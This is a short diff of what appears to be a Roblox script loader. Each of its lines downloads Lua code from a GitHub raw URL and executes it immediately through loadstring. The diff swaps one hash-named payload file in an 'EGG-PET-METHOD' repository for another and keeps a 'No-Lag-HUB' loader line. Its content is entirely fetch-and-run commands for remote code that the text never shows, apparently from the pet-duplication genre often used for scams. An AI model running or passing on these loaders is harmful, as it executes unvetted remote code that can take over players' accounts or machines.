@@ -1,2 +1,2 @@
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV2.lua"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/muzammil909900/EGG-PET-METHOD/refs/heads/main/351d51bdaaa9c7ef38c715a8330fc4dd.txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/muzammil909900/EGG-PET-METHOD/refs/heads/main/e000dcbd121c14d805b7c7689d79e8cd.txt"))()
